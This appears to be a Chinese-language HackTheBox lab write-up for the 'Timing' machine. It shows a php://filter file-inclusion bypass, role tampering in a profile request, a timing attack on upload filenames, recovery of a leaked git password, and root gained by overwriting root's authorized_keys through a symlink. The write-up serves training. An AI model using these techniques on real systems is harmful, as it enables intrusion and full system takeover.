---
title: Timing
date: 2022-04-02 10:31:57
tags: HackThebox
categories: 越权漏洞
---

## 信息收集
发现目标主机开放了ssh和web服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/7d3e41d24d1a44a1aa4a82b48365cf65.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
访问web页面时，发现是个表单登录页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/6730e5cfcb824e4f985f905cdd94cbb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

尝试一下是否存在弱口令，虽然hackthebox不太可能，但是还得走这流程。很显然，弱口令是不存在的
![在这里插入图片描述](https://img-blog.csdnimg.cn/cd4aa6f0ffdd41469bacdb1fdd08e639.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们扫一下目录吧，看看有什么新发现，发现存在一个images目录和image.php文件

```bash
ffuf -u http://10.10.11.135/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/af20f495b50d40c184a97f26c294aec4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

<!--more-->

访问image.php文件时，发现是个空内容啥也没有。访问image目录时，显示403
![在这里插入图片描述](https://img-blog.csdnimg.cn/8703d35872f5488d9754581fe77c141a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/80aab0b40e594eaeaa21d97f32c88383.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
感觉可以再进行进一步的fuzz，发现存在一个uploads目录，但是无法访问
![在这里插入图片描述](https://img-blog.csdnimg.cn/dc96ca0ce9ef4327b9910999404347a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们可以尝试fuzz一下image.php的一些参数值，fuzz出很多的值，但是访问基本也是空。初步判断可能参数错了
![在这里插入图片描述](https://img-blog.csdnimg.cn/418e84689eb34eefab53e7995fec7623.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们再换另一个参数试试
![在这里插入图片描述](https://img-blog.csdnimg.cn/8203f41504894bbb85b08a5f380bacb1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
这边是可以读取到一个字符串的
![在这里插入图片描述](https://img-blog.csdnimg.cn/007de0f07faa4f33ba9c546cb931c296.png)
依照内容提示，我们应该是遇到WAF了。那接下来我们就得绕过这个WAF，读取我们想要读取到的内容

## 漏洞利用
通过参考github上面大佬的总结，我们可以使用php数据流读取的形式进行读取文件的相应内容，这是参考链接[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3952e04a31494c99aeb6570c202c003b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们对字符串进行base64解密，得到的内容如下。表示可以成功读取到文件内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/57dc03f7f5014d629a8d94ed5135803e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们读取到image.php的内容如下，存在黑名单过滤

```php
<?php

function is_safe_include($text)
{
    $blacklist = array("php://input", "phar://", "zip://", "ftp://", "file://", "http://", "data://", "expect://", "https://", "../");

    foreach ($blacklist as $item) {
        if (strpos($text, $item) !== false) {
            return false;
        }
    }
    return substr($text, 0, 1) !== "/";

}

if (isset($_GET['img'])) {
    if (is_safe_include($_GET['img'])) {
        include($_GET['img']);
    } else {
        echo "Hacking attempt detected!";
    }
}

```

我们读取到upload.php内容如下

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```
可以看到存在一个`admin_auth_check.php`文件，我们尝试读取一下其内容

```php
<?php

include_once "auth_check.php";

if (!isset($_SESSION['role']) || $_SESSION['role'] != 1) {
    echo "No permission to access this panel!";
    header('Location: ./index.php');
    die();
}

?>
```
很明显，根据代码的逻辑，我们要想使用上传功能，就必须拥有role1的权限，想到这里可能是要越权操作。我们很幸运可以使用`aaron:aaron`的账户密码登录成功。我们获取到的是一个user2的权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/f17dab9551f64efa9fb265cb910804b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们进行进一步的越权操作，我们点击`Edit profile`，然后抓包分析，放包时发现似乎并没有role的权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/efe338fada3e45558e41322739063e34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
那我们可以自己添加一个role权限值，然后放包刷新，发现role值发生了改变
![在这里插入图片描述](https://img-blog.csdnimg.cn/8f57f2c56f8e46319366b09757a8fc54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
刷新页面后，发现存在一个上传点
![在这里插入图片描述](https://img-blog.csdnimg.cn/324086907b80430d93ee8b978ce18b77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
接着我们先把时间改为GMT，命令为

```bash
cp /usr/share/zoneinfo/GMT /etc/localtime
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0027306e60a448d79184278f3cbbeaaa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们上传图片马后，先抓个包，然后再输入`php -a`，输入的命令如下，主要是循环一个变量，先打印时间，然后打印文件的md5值，最后换行和休眠一秒

```bash
while (true){echo date("D M j G:i:s T Y"); echo " = " ; echo md5('$file_hash' .time());echo "\n";sleep(1);}
```
执行这个命令后我们立刻放包，然后停止循环，逐个尝试后，最后得出可以得到用户的用户名
![在这里插入图片描述](https://img-blog.csdnimg.cn/02d568e8d7ee4f6ba24ded2e9ce6a138.png)
那么我们可以依照这个方法，获取我们的shell终端。因为这台机器有防火墙，所以我们得先看看`/opt`目录下都有哪些文件，只有一个源码zip文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/ae1644279489441d81fccc3517d0a89b.png)
我们可以先把它复制到`/var/www/html/images/uploads/`这个目录上
![在这里插入图片描述](https://img-blog.csdnimg.cn/8a162920d1b149a8bd1c94f42b3b1628.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们使用curl命令进行下载

```bash
curl 'http://10.10.11.135/image.php?img=images/uploads/source-files-backup.zip' --output source-files-backup.zip
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba0018e2906c4c649cdfbb25a697d364.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后我们解压看看里面都存在哪些内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/c596f4bf5cd34ce6bb749c3bec25e375.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
解压后我们发现存在一个`.git`目录
![在这里插入图片描述](https://img-blog.csdnimg.cn/d8e8e9101a864918bfe2835a8987fe5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们使用`GitTools`的`extractor.sh`脚本看看都存在哪些内容。进入source文件夹内，发现多了两个目录

```bash
./extractor.sh . source
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4cdb9273029742e7aa26f722ffc9ef77.png)
我们使用`diff`命令发现存在数据库密码

```bash
diff 0-e4e214696159a25c69812571c8214d2bf8736a3f 1-16de2698b5b122c93461298eab730d00273bd83e
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/06831bed1dce420c920515b450a143d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们分别使用这两个密码尝试登录，发现`S3cr3t_unGu3ss4bl3_p422w0Rd`这个密码可以成功登陆aaron账户
![在这里插入图片描述](https://img-blog.csdnimg.cn/9b081d9bc9084d5f842fc3d35a740286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
## 提权
输入`sudo -l`后发现一个程序`netutils`可以无密码以root权限运行
![在这里插入图片描述](https://img-blog.csdnimg.cn/5b562de4546c4cdda94e39decdd209be.png)
发现直接运行并不能成功，查看一下文件类型，发现是一个脚本文件，类型为jar文件。并且运行时提示了两个选项，一个是FTP，另一个是HTTP
![在这里插入图片描述](https://img-blog.csdnimg.cn/898ee64288d648eba2d202960e1ed0f0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
我们在本地开启一个HTTP服务，并尝试能否成功下载，发现可以成功下载我物理机的文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/e5282fef41fc4abca23b0baf182e7b3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
并且权限还是root权限，那这就好办了
![在这里插入图片描述](https://img-blog.csdnimg.cn/faca0ac016ec4c048a6dd3f9255056ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
首先我们对root账户下的.ssh文件创建一个链接

```bash
ln -s /root/.ssh/authorized_keys keys
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/50a0b703d7264cd39341165839e2ee62.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)

然后我们本地生成一个ssh密钥，并将其改名为keys(这一步一定要做，不改名无法连接密钥)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2c33fcabfdcd47fb803e2604c6d77ed2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
然后开放http服务，运行`netutils`程序，选择HTTP选项，将公钥下载到靶机上
![在这里插入图片描述](https://img-blog.csdnimg.cn/a32c8bc3ae9747209518a3d4ae77b060.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
最后在物理机上连接root用户
![在这里插入图片描述](https://img-blog.csdnimg.cn/fadd0b445a964527b626423dcec9e6e2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16)
